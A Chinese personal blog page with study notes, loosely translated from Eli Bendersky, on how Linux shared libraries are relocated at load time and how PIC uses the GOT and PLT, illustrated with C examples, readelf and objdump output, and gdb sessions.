<span class="number">00002010</span>  <span class="number">00000307</span> R_386_JUMP_SLOT   <span class="number">00000000</span>   __gmon_start__
<span class="number">00002014</span>  <span class="number">00000907</span> R_386_JUMP_SLOT   <span class="number">0000057</span>c   ml_util_func
</code></pre><p>最后一行很表示载入器应该把符号<code>ml_util_func</code>的地址放入<code>0x2014</code>中(这个函数的GOT条目)</p>
<p>以上是在elf文件中。虽然</p>
<p>我们在gdb中检查首次调用函数后GOT条目的更改：</p>
<pre><code> ~/Work/project/blackhat/eli  gdb -q ./driver
Reading symbols from /home/lyy/Work/project/blackhat/eli/driver..<span class="string">.done</span>.
(gdb) b ml_func
Breakpoint <span class="number">1</span> <span class="preprocessor">at</span> <span class="number">0x80484b0</span>
(gdb) run
Starting program: /home/lyy/Work/project/blackhat/eli/./driver 
<span class="label">warning:</span> the debug information found <span class="keyword">in</span> <span class="string">"/usr/lib64/debug/lib64/ld-2.17.so.debug"</span> does <span class="keyword">not</span> match <span class="string">"/lib/ld-linux.so.2"</span> (CRC mismatch).

addr myglob = <span class="number">0x804a024</span>

Breakpoint <span class="number">1</span>, ml_func (a=<span class="number">1</span>, b=<span class="number">1</span>) <span class="preprocessor">at</span> ml_main_pic.c:<span class="number">10</span>
<span class="number">10</span>          <span class="keyword">int</span> c = b + ml_util_func(a)<span class="comment">;</span>
(gdb) disas ml_func
Dump of assembler code for function ml_func:
   <span class="number">0xf7fd8587</span> &lt;+<span class="number">0</span>&gt;:     <span class="keyword">push</span>   <span class="literal">ebp</span>
   <span class="number">0xf7fd8588</span> &lt;+<span class="number">1</span>&gt;:     <span class="keyword">mov</span>    <span class="literal">ebp</span>,<span class="literal">esp</span>
   <span class="number">0xf7fd858a</span> &lt;+<span class="number">3</span>&gt;:     <span class="keyword">push</span>   <span class="literal">ebx</span>
   <span class="number">0xf7fd858b</span> &lt;+<span class="number">4</span>&gt;:     <span class="keyword">sub</span>    <span class="literal">esp</span>,<span class="number">0x24</span>
   <span class="number">0xf7fd858e</span> &lt;+<span class="number">7</span>&gt;:     <span class="keyword">call</span>   <span class="number">0xf7fd8450</span> &lt;__x86.get_pc_thunk.bx&gt;
   <span class="number">0xf7fd8593</span> &lt;+<span class="number">12</span>&gt;:    <span class="keyword">add</span>    <span class="literal">ebx</span>,<span class="number">0x1a6d</span>
=&gt; <span class="number">0xf7fd8599</span> &lt;+<span class="number">18</span>&gt;:    <span class="keyword">mov</span>    <span class="literal">eax</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">ebp</span>+<span class="number">0x8</span>]
   <span class="number">0xf7fd859c</span> &lt;+<span class="number">21</span>&gt;:    <span class="keyword">mov</span>    <span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">esp</span>],<span class="literal">eax</span>
   <span class="number">0xf7fd859f</span> &lt;+<span class="number">24</span>&gt;:    <span class="keyword">call</span>   <span class="number">0xf7fd8440</span> &lt;ml_util_func@plt&gt;
   <span class="number">0xf7fd85a4</span> &lt;+<span class="number">29</span>&gt;:    <span class="keyword">mov</span>    <span class="literal">edx</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">ebp</span>+<span class="number">0xc</span>]
   <span class="number">0xf7fd85a7</span> &lt;+<span class="number">32</span>&gt;:    <span class="keyword">add</span>    <span class="literal">eax</span>,<span class="literal">edx</span>
   <span class="number">0xf7fd85a9</span> &lt;+<span class="number">34</span>&gt;:    <span class="keyword">mov</span>    <span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">ebp</span>-<span class="number">0xc</span>],<span class="literal">eax</span>
   <span class="number">0xf7fd85ac</span> &lt;+<span class="number">37</span>&gt;:    <span class="keyword">mov</span>    <span class="literal">eax</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">ebx</span>-<span class="number">0x14</span>]
   <span class="number">0xf7fd85b2</span> &lt;+<span class="number">43</span>&gt;:    <span class="keyword">mov</span>    <span class="literal">edx</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">eax</span>]
   <span class="number">0xf7fd85b4</span> &lt;+<span class="number">45</span>&gt;:    <span class="keyword">mov</span>    <span class="literal">eax</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">ebp</span>-<span class="number">0xc</span>]
   <span class="number">0xf7fd85b7</span> &lt;+<span class="number">48</span>&gt;:    <span class="keyword">add</span>    <span class="literal">edx</span>,<span class="literal">eax</span>
   <span class="number">0xf7fd85b9</span> &lt;+<span class="number">50</span>&gt;:    <span class="keyword">mov</span>    <span class="literal">eax</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">ebx</span>-<span class="number">0x14</span>]
   <span class="number">0xf7fd85bf</span> &lt;+<span class="number">56</span>&gt;:    <span class="keyword">mov</span>    <span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">eax</span>],<span class="literal">edx</span>
   <span class="number">0xf7fd85c1</span> &lt;+<span class="number">58</span>&gt;:    <span class="keyword">mov</span>    <span class="literal">eax</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">ebx</span>-<span class="number">0x14</span>]
   <span class="number">0xf7fd85c7</span> &lt;+<span class="number">64</span>&gt;:    <span class="keyword">mov</span>    <span class="literal">edx</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">eax</span>]
   <span class="number">0xf7fd85c9</span> &lt;+<span class="number">66</span>&gt;:    <span class="keyword">mov</span>    <span class="literal">eax</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">ebp</span>+<span class="number">0xc</span>]
   <span class="number">0xf7fd85cc</span> &lt;+<span class="number">69</span>&gt;:    <span class="keyword">add</span>    <span class="literal">eax</span>,<span class="literal">edx</span>
   <span class="number">0xf7fd85ce</span> &lt;+<span class="number">71</span>&gt;:    <span class="keyword">add</span>    <span class="literal">esp</span>,<span class="number">0x24</span>
---Type &lt;return&gt; to continue, <span class="keyword">or</span> q &lt;return&gt; to quit---q
Quit
(gdb) i registers <span class="literal">ebx</span>   #GOT基址
<span class="literal">ebx</span>            <span class="number">0xf7fda000</span>       -<span class="number">134373376</span>
(gdb) x/x <span class="number">0xf7fda000</span>+<span class="number">0x14</span>   # GOT中ml_util_func的地址
<span class="number">0xf7fda014</span>:     <span class="number">0xf7fd8446</span>  #和之前ELF文件中类似
(gdb) disas <span class="number">0xf7fd8440</span>  # ml_util_func@plt
Dump of assembler code for function ml_util_func@plt:
   <span class="number">0xf7fd8440</span> &lt;+<span class="number">0</span>&gt;:     <span class="keyword">jmp</span>    <span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">ebx</span>+<span class="number">0x14</span>]
   <span class="number">0xf7fd8446</span> &lt;+<span class="number">6</span>&gt;:     <span class="keyword">push</span>   <span class="number">0x10</span>
   <span class="number">0xf7fd844b</span> &lt;+<span class="number">11</span>&gt;:    <span class="keyword">jmp</span>    <span class="number">0xf7fd8410</span>
End of assembler dump.
</code></pre><p>调用一次：</p>
<pre><code>(gdb) n
<span class="number">11</span>          myglob += c;
(gdb) x/x <span class="number">0xf7fda000</span>+<span class="number">0x14</span>
<span class="number">0xf7fda014</span>:     <span class="number">0xf7fd857c</span>
(gdb) p &amp;ml_util_func
$<span class="number">1</span> = (<span class="keyword">int</span> (*)(<span class="keyword">int</span>)) <span class="number">0xf7fd857c</span> &lt;ml_util_func&gt;
</code></pre><p>可见GOT条目已经被更改。</p>
<h2 id="通过环境变量控制载入解析">通过环境变量控制载入解析</h2><p>通过<code>LD_BIND_NOW</code>和<code>LD_BIND_NOT</code>来定义加载方式。</p>
<pre><code><span class="keyword">man</span> ld.<span class="keyword">so</span>
</code></pre><h3 id="PIC的代价">PIC的代价</h3><ul>
<li>所有PIC中外部数据代码引用都需要额外的重定向，需要更多的内存。</li>
<li>在x86平台上多占用了一个通用寄存器，结果就需要更多内存引用。</li>
</ul>
<h3 id="结论">结论</h3><p>x64的好像作者没有写了。。。。。。。</p>
<p>x64平台上，因为能相对<code>rip</code>寻址，不需要通过某种方式获取程序指针。</p>
<p>关于<code>.got</code>和<code>.got.plt</code>提下，就是为了区分数据和函数引用，一个从GOT基址负引用<code>ebx-0x14</code>一个正引用<code>ebx+0x14</code>。这个设计= =</p>
<h2 id="Footnotes">Footnotes</h2>
            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/linux/2015/03/18/load-time-relocation-of-shared-libraries/" itemprop="url">
                  Load time relocation of shared libraries
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2015-03-18T00:00:00+08:00" content="2015-03-18">
              2015-03-18
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/linux/" itemprop="url" rel="index">
                    <span itemprop="name">linux</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/linux/2015/03/18/load-time-relocation-of-shared-libraries/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="linux/2015/03/18/load-time-relocation-of-shared-libraries/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>想起昨天某厂电面被问到GOT怎么组织的= =，哈？我回头翻了翻Eli Bendersky的<a href="http://eli.thegreenplace.net/2011/08/25/load-time-relocation-of-shared-libraries/" target="_blank" rel="external">Load-time relocation of shared libraries</a>和<a href="http://eli.thegreenplace.net/2011/11/03/position-independent-code-pic-in-shared-libraries/" target="_blank" rel="external">Position Independent Code (PIC) in shared libraries</a>。<a href="http://eli.thegreenplace.net" target="_blank" rel="external">Eli Bendersky</a>的网站我非常喜欢，他总能把复杂的问题以一种探索性的方式直观的阐释。我记得当我非常好奇gdb的原理时曾经看到过他的<a href="http://eli.thegreenplace.net/2011/01/23/how-debuggers-work-part-1/" target="_blank" rel="external">How debuggers work: Part 1 - Basics </a>和<a href="http://eli.thegreenplace.net/2011/01/27/how-debuggers-work-part-2-breakpoints/" target="_blank" rel="external">How debuggers work: Part 2 - Breakpoints</a>，都是难得一见的精品，值得一看</p>
<p>不吐槽面试了，作为面试简直是个惨不忍睹的失败展示，大概让面试官觉得我很low没发展前途，哈哈哈。不过被虐了感觉真好，要有空去面面各种开发测试产品设计。。。。。。一个人怎么能有这么多兴趣！</p>
<p>正文，省得过一段又忘的干干净净，意译<a href="http://eli.thegreenplace.net/2011/08/25/load-time-relocation-of-shared-libraries/" target="_blank" rel="external">Load-time relocation of shared libraries </a>x64对这个都没支持了= =</p>
<p>程序有时候，几乎总是要导入来自外部的目标代码。有两种载入的方式：</p>
<ul>
<li>载入时重定位</li>
<li>PIC(位置无关代码)</li>
</ul>
<p>讲讲第一种。</p>
<p>可执行文件，动态链接库，blablablabla的什么能直接被机器执行的文件，都是机器码(废话…)要让文件可以执行和装载，必须符合ELF文件规范。操作系统根据ELF文件中提供的信息，按照规范把对应的代码段映射到内存空间的对应位置上去。内存空间大概看上去像这样：</p>
<p><img src="http://static.duartes.org/img/blogPosts/linuxFlexibleAddressSpaceLayout.png" alt="x86内存空间地址分布"></p>
<p>可以看到，文件映射，动态库啥的都是放到差不多中间的位置。</p>
<p>举个例子，我们关心几个问题，<code>ml_func</code>内如何解析(reference)<code>myglob</code>呢</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> myglob = <span class="number">42</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ml_func</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    myglob += a;</span><br><span class="line">    <span class="keyword">return</span> b + myglob;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译为非PIC，x86 动态共享库</p>
<pre><code> ~<span class="regexp">/Work/project</span><span class="regexp">/blackhat/eli</span>  gcc -m32 -shared -o libmlreloc.so ml_mainreloc.o
/usr/<span class="class"><span class="keyword">lib</span>/<span class="title">gcc</span>/<span class="title">x86_64</span>-<span class="title">pc</span>-<span class="title">linux</span>-<span class="title">gnu</span>/4.7.3/../../../../<span class="title">x86_64</span>-<span class="title">pc</span>-<span class="title">linux</span>-<span class="title">gnu</span>/<span class="title">bin</span>/<span class="title">ld</span>: <span class="title">ml_mainreloc</span>.<span class="title">o</span>: <span class="title">warning</span>: <span class="title">relocation</span> <span class="title">against</span> `<span class="title">myglob</span>' <span class="title">in</span> <span class="title">readonly</span> <span class="title">section</span> `.<span class="title">text</span>'.</span>
/usr/<span class="class"><span class="keyword">lib</span>/<span class="title">gcc</span>/<span class="title">x86_64</span>-<span class="title">pc</span>-<span class="title">linux</span>-<span class="title">gnu</span>/4.7.3/../../../../<span class="title">x86_64</span>-<span class="title">pc</span>-<span class="title">linux</span>-<span class="title">gnu</span>/<span class="title">bin</span>/<span class="title">ld</span>: <span class="title">warning</span>: <span class="title">creating</span> <span class="title">a</span> <span class="title">DT_TEXTREL</span> <span class="title">in</span> <span class="title">object</span>.</span>
</code></pre><p>把<code>myglob</code>重定位到了只读的<code>.text</code>。。。不过对研究没啥影响。</p>
<p>首先看看库的入口地址，链接器会从入口地址(‘.text’的开始位置)开始把代码载入调用者的进程空间。</p>
<pre><code> <span class="regexp">~/Work/</span>project<span class="regexp">/blackhat/</span>eli  readelf -h libmlreloc.so
ELF <span class="string">Header:</span>
    ...
  Entry point <span class="string">address:</span>               <span class="number">0x420</span>
    ...
</code></pre><p>反汇编共享库</p>
<pre><code>~/Work/project/blackhat/eli  objdump -d -Mintel libmlreloc.so

libmlreloc.so:     file format elf32-i386
...
<span class="number">0000054</span>c &lt;ml_func&gt;:
 <span class="number">54</span>c:   <span class="number">55</span>                      push   ebp
 <span class="number">54</span>d:   <span class="number">89</span> e5                   mov    ebp,esp
 <span class="number">54f</span>:   <span class="number">8</span>b <span class="number">15</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       mov    edx,DWORD PTR ds:<span class="number">0x0</span>
 <span class="number">555</span>:   <span class="number">8</span>b <span class="number">45</span> <span class="number">08</span>                mov    eax,DWORD PTR [ebp+<span class="number">0x8</span>]
 <span class="number">558</span>:   <span class="number">01</span> d0                   add    eax,edx
 <span class="number">55</span>a:   a3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov    ds:<span class="number">0x0</span>,eax
 <span class="number">55f</span>:   <span class="number">8</span>b <span class="number">15</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       mov    edx,DWORD PTR ds:<span class="number">0x0</span>
 <span class="number">565</span>:   <span class="number">8</span>b <span class="number">45</span> <span class="number">0</span>c                mov    eax,DWORD PTR [ebp+<span class="number">0xc</span>]
 <span class="number">568</span>:   <span class="number">01</span> d0                   add    eax,edx
 <span class="number">56</span>a:   <span class="number">5</span>d                      pop    ebp
 <span class="number">56</span>b:   c3                      ret    
 ...
</code></pre><p><code>myglob</code>即<code>ds:0x0</code>丫的是什么！这个地址，在载入其它程序进程空间后会被替代。</p>
<p>如何呢？</p>
<pre><code> ~/Work/project/blackhat/eli  readelf -r libmlreloc.so

Relocation section '.rel.dyn' at offset 0x358 contains 11 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
00001ee8  <span class="number">00000008</span> R_386_RELATIVE   
00001eec  <span class="number">00000008</span> R_386_RELATIVE   
<span class="number">00002014</span>  <span class="number">00000008</span> R_386_RELATIVE   
<span class="number">00000551</span>  <span class="number">00000601</span> R_386_32          <span class="number">00002018</span>   myglob
<span class="number">0000055</span>b  <span class="number">00000601</span> R_386_32          <span class="number">00002018</span>   myglob
<span class="number">00000561</span>  <span class="number">00000601</span> R_386_32          <span class="number">00002018</span>   myglob
</code></pre><p>看看动态库文件中怎么记录该怎么替换哪里要替换的信息吧</p>
<pre><code> ~/Work/project/blackhat/eli  readelf -r libmlreloc.so

Relocation section '.rel.dyn' at offset 0x358 contains 11 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
00001ee8  <span class="number">00000008</span> R_386_RELATIVE   
00001eec  <span class="number">00000008</span> R_386_RELATIVE   
<span class="number">00002014</span>  <span class="number">00000008</span> R_386_RELATIVE   
<span class="number">00000551</span>  <span class="number">00000601</span> R_386_32          <span class="number">00002018</span>   myglob
<span class="number">0000055</span>b  <span class="number">00000601</span> R_386_32          <span class="number">00002018</span>   myglob
<span class="number">00000561</span>  <span class="number">00000601</span> R_386_32          <span class="number">00002018</span>   myglob
</code></pre><p>有这么好几处要替换的，看下位置和objdump的位置一样。</p>
<p>根据ELF文件规则。这些地址这样替换:</p>
<pre><code>Offset位置的地址=Sym.<span class="function"><span class="title">Value</span><span class="params">(用nm可以看到将来映射后相对于虚拟载入基址的偏移)</span></span> + 库文件载入基址
</code></pre><p>下面看看看。作为初始化了的数据，<code>myglob</code>是放在<code>.data</code>中的。我们看看<code>.data</code>在哪。</p>
<pre><code> ~/Work/project/blackhat/eli  readelf --segments libmlreloc<span class="class">.so</span>

Elf file type is DYN (Shared <span class="tag">object</span> file)
Entry point <span class="number">0</span>x420
There are <span class="number">7</span> program headers, starting at offset <span class="number">52</span>

Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  LOAD           <span class="number">0</span>x000000 <span class="number">0</span>x00000000 <span class="number">0</span>x00000000 <span class="number">0</span>x005fc <span class="number">0</span>x005fc R E <span class="number">0</span>x1000
  LOAD           <span class="number">0</span>x000ee8 <span class="number">0</span>x00001ee8 <span class="number">0</span>x00001ee8 <span class="number">0</span>x00134 <span class="number">0</span>x00138 RW  <span class="number">0</span>x1000
  DYNAMIC        <span class="number">0</span>x000ef4 <span class="number">0</span>x00001ef4 <span class="number">0</span>x00001ef4 <span class="number">0</span>x000f8 <span class="number">0</span>x000f8 RW  <span class="number">0</span>x4
  GNU_EH_FRAME   <span class="number">0</span>x000580 <span class="number">0</span>x00000580 <span class="number">0</span>x00000580 <span class="number">0</span>x0001c <span class="number">0</span>x0001c R   <span class="number">0</span>x4
  GNU_STACK      <span class="number">0</span>x000000 <span class="number">0</span>x00000000 <span class="number">0</span>x00000000 <span class="number">0</span>x00000 <span class="number">0</span>x00000 RW  <span class="number">0</span>x4
  GNU_RELRO      <span class="number">0</span>x000ee8 <span class="number">0</span>x00001ee8 <span class="number">0</span>x00001ee8 <span class="number">0</span>x00118 <span class="number">0</span>x00118 R   <span class="number">0</span>x1
  PAX_FLAGS      <span class="number">0</span>x000000 <span class="number">0</span>x00000000 <span class="number">0</span>x00000000 <span class="number">0</span>x00000 <span class="number">0</span>x00000     <span class="number">0</span>x4

 Section to Segment mapping:
  Segment Sections...
   <span class="number">00</span>     <span class="class">.hash</span> <span class="class">.gnu</span><span class="class">.hash</span> <span class="class">.dynsym</span> <span class="class">.dynstr</span> <span class="class">.gnu</span><span class="class">.version</span> <span class="class">.gnu</span><span class="class">.version_r</span> <span class="class">.rel</span><span class="class">.dyn</span> <span class="class">.rel</span><span class="class">.plt</span> <span class="class">.init</span> <span class="class">.plt</span> <span class="class">.text</span> <span class="class">.fini</span> <span class="class">.eh_frame_hdr</span> <span class="class">.eh_frame</span> 
   <span class="number">01</span>     <span class="class">.init_array</span> <span class="class">.fini_array</span> <span class="class">.jcr</span> <span class="class">.dynamic</span> <span class="class">.got</span> <span class="class">.got</span><span class="class">.plt</span> <span class="class">.data</span> <span class="class">.bss</span> 
   <span class="number">02</span>     <span class="class">.dynamic</span> 
   <span class="number">03</span>     <span class="class">.eh_frame_hdr</span> 
   <span class="number">04</span>     
   <span class="number">05</span>     <span class="class">.init_array</span> <span class="class">.fini_array</span> <span class="class">.jcr</span> <span class="class">.dynamic</span> <span class="class">.got</span> 
   <span class="number">06</span>     
</code></pre><p><code>.data</code>是第二个段，载入后的虚拟地址是<code>0x1ee8</code>，大小是<code>0x00134</code></p>
<pre><code>In [<span class="number">18</span>]: <span class="function"><span class="title">hex</span><span class="params">(<span class="number">0</span>x1ee8+<span class="number">0</span>x134)</span></span>
Out[<span class="number">18</span>]: <span class="string">'0x201c'</span>
</code></pre><p>第二个段扩展到<code>0x201c</code>包含<code>myglob</code>(<code>0x2018</code>)</p>
<p>linux下有个方便的<code>dl_iterate_phdr</code>函数来查看运行时载入的动态链接库。gdb的<code>i shared</code>也可以看到载入库的地址，不过只能看到入口地址而不能看到每个段。</p>
<p>用这么个例子来看：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;link.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">header_handler</span><span class="params">(<span class="keyword">struct</span> dl_phdr_info* info, size_t size, <span class="keyword">void</span>* data)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"name=%s (%d segments) address=%p\n"</span>,</span><br><span class="line">            info-&gt;dlpi_name, info-&gt;dlpi_phnum, (<span class="keyword">void</span>*)info-&gt;dlpi_addr);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; info-&gt;dlpi_phnum; j++) &#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">"\t\t header %2d: address=%10p\n"</span>, j,</span><br><span class="line">             (<span class="keyword">void</span>*) (info-&gt;dlpi_addr + info-&gt;dlpi_phdr[j].p_vaddr));</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">"\t\t\t type=%u, flags=0x%X\n"</span>,</span><br><span class="line">                 info-&gt;dlpi_phdr[j].p_type, info-&gt;dlpi_phdr[j].p_flags);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">ml_func</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">int</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    dl_iterate_phdr(header_handler, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> t = ml_func(argc, argc);</span><br><span class="line">    <span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那啥回调啥原理不说了，我也不懂，反正用来看载入地址就好。</p>
<pre><code>✘  ~<span class="regexp">/Work/</span><span class="keyword">project</span><span class="regexp">/blackhat/</span>eli  gcc -std=c99 -m32 -g -c driver.c -o driver.o
~<span class="regexp">/Work/</span><span class="keyword">project</span><span class="regexp">/blackhat/</span>eli  gcc -m32 -o driver driver.o -L. -lmlreloc 
</code></pre><p>直接gdb会话：</p>
<pre><code> ~/Work/project/blackhat/eli  gdb -q driver
Reading symbols from /home/reverland/Work/project/blackhat/eli/driver...done.
(gdb) b driver.c:<span class="number">31</span>
Breakpoint <span class="number">1</span> at <span class="number">0x804874b</span>: file driver.c, line <span class="number">31.</span>
(gdb) r
Starting program: /home/reverland/Work/project/blackhat/eli/driver 
warning: the debug information found in <span class="string">"/usr/lib64/debug/lib64/ld-2.17.so.debug"</span> does not match <span class="string">"/lib/ld-linux.so.2"</span> (CRC mismatch).
...
name=/home/reverland/Work/project/blackhat/eli/libmlreloc.so (<span class="number">7</span> segments) address=<span class="number">0xf7fd8000</span>
                 header  <span class="number">0</span>: address=<span class="number">0xf7fd8000</span>
                         type=<span class="number">1</span>, flags=<span class="number">0x5</span>
                 header  <span class="number">1</span>: address=<span class="number">0xf7fd9ee8</span>
                         type=<span class="number">1</span>, flags=<span class="number">0x6</span>
                 header  <span class="number">2</span>: address=<span class="number">0xf7fd9ef4</span>
                         type=<span class="number">2</span>, flags=<span class="number">0x6</span>
                 header  <span class="number">3</span>: address=<span class="number">0xf7fd8580</span>
                         type=<span class="number">1685382480</span>, flags=<span class="number">0x4</span>
                 header  <span class="number">4</span>: address=<span class="number">0xf7fd8000</span>
                         type=<span class="number">1685382481</span>, flags=<span class="number">0x6</span>
                 header  <span class="number">5</span>: address=<span class="number">0xf7fd9ee8</span>
                         type=<span class="number">1685382482</span>, flags=<span class="number">0x4</span>
                 header  <span class="number">6</span>: address=<span class="number">0xf7fd8000</span>
                         type=<span class="number">1694766464</span>, flags=<span class="number">0x2800</span>
...
(gdb) p &amp;myglob
$<span class="number">1</span> = (<span class="keyword">int</span> *) <span class="number">0xf7fda018</span> &lt;myglob&gt;
(gdb) 
</code></pre><p>忽视调试信息的警告，那个我记得好像是gentoo的某个bug。我们看到，<code>libmlreloc.so</code>被载入到了<code>0xf7fd8000</code>，别太在意这个地址，按理说ALSR啥的这个地址变化挺正常，虽然我记得gdb中默认禁用alsr了。。。</p>
<p>第二个段在<code>0xf7fd9ee8</code>。这正好就是载入基址(<code>0xf7fd8000</code>)+VirtAddr(就是映射到目标进程空间后的偏移<code>0x00001ee8</code>)</p>
<p>另一方面，我们看到<code>myglob</code>在<code>0xf7fda018</code>。这个地址正好是载入基址(<code>0xf7fd8000</code>)+myglob的偏移(<code>0x00002018</code>)</p>
<p>我们最后在gdb中看下现在的(载入动态库后)的反汇编结果：</p>
<pre><code>(gdb) disas /r ml_func
Dump of assembler code for function ml_func:
   <span class="number">0xf7fd854c</span> &lt;+<span class="number">0</span>&gt;:     <span class="number">55</span>      <span class="keyword">push</span>   <span class="literal">ebp</span>
   <span class="number">0xf7fd854d</span> &lt;+<span class="number">1</span>&gt;:     <span class="number">89</span> e5   <span class="keyword">mov</span>    <span class="literal">ebp</span>,<span class="literal">esp</span>
   <span class="number">0xf7fd854f</span> &lt;+<span class="number">3</span>&gt;:     8b <span class="number">15</span> <span class="number">18</span> a0 fd f7       <span class="keyword">mov</span>    <span class="literal">edx</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> <span class="literal">ds</span>:<span class="number">0xf7fda018</span>
   <span class="number">0xf7fd8555</span> &lt;+<span class="number">9</span>&gt;:     8b <span class="number">45</span> <span class="number">08</span>        <span class="keyword">mov</span>    <span class="literal">eax</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">ebp</span>+<span class="number">0x8</span>]
   <span class="number">0xf7fd8558</span> &lt;+<span class="number">12</span>&gt;:    <span class="number">01</span> d0   <span class="keyword">add</span>    <span class="literal">eax</span>,<span class="literal">edx</span>
   <span class="number">0xf7fd855a</span> &lt;+<span class="number">14</span>&gt;:    a3 <span class="number">18</span> a0 fd f7  <span class="keyword">mov</span>    <span class="literal">ds</span>:<span class="number">0xf7fda018</span>,<span class="literal">eax</span>
   <span class="number">0xf7fd855f</span> &lt;+<span class="number">19</span>&gt;:    8b <span class="number">15</span> <span class="number">18</span> a0 fd f7       <span class="keyword">mov</span>    <span class="literal">edx</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> <span class="literal">ds</span>:<span class="number">0xf7fda018</span>
   <span class="number">0xf7fd8565</span> &lt;+<span class="number">25</span>&gt;:    8b <span class="number">45</span> 0c        <span class="keyword">mov</span>    <span class="literal">eax</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">ebp</span>+<span class="number">0xc</span>]
   <span class="number">0xf7fd8568</span> &lt;+<span class="number">28</span>&gt;:    <span class="number">01</span> d0   <span class="keyword">add</span>    <span class="literal">eax</span>,<span class="literal">edx</span>
